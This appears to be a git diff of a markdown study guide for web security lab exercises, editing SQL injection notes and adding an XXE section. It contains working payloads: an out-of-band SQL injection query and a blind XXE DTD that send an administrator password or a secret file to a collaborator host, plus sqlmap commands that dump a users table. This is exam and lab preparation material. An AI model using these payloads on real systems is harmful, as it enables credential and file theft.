@@ -236,7 +236,7 @@ Connection: close
 
 ![Identify the input parameter vulnerable to SQL injection](identify-sqli-parameter.png)  
 
-<sup>Out of band data exfiltration SQL query</sup>  
+<sup>Out of band data exfiltration SQL query, Example:</sup>  
 
 ```sql
 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
@@ -265,7 +265,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables
 
-sqlmap -v -u 'https://0a00000a03b7eef2c18913c400660003.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=3 --risk=3
+sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=3 --risk=3
 
 ```  
 
@@ -275,7 +275,42 @@ sqlmap -v -u 'https://0a00000a03b7eef2c18913c400660003.web-security-academy.net/
 <sub>Alternative SQLMAP if finding a blind boolean based vulnerability, and to speed up process the following command perform an error based technique.</sub>  
 
 ```bash
-sqlmap -v -r request.txt -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
+sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
 ```
+
+## XXE Injection
+
+>File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.
+
+<sub>Idnetify XXE in not so obvious parameters or requests by adding the below and URL encode thr **&** symbol.</sub>
+
+```xml
+%26entity;
+```  
+
+>On the exploit server host a exploit file with DTD extension, containing the following payload.  
+
+```xml
+<!ENTITY % file SYSTEM "file:///home/carlos/secret">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR.net/?x=%file;'>">
+%eval;
+%exfil;
+```  
+
+>Modify the file upload XML body of the request before sending to the target server.  
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit.dtd"> %xxe;]>
+<users>
+    <user>
+        <username>Carl Toyota</username>
+        <email>carl@hacked.net</email>
+    </user>    
+</users>
+
+```
+
+![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](blind-xxe-exploit-dtd.png)  
 
 
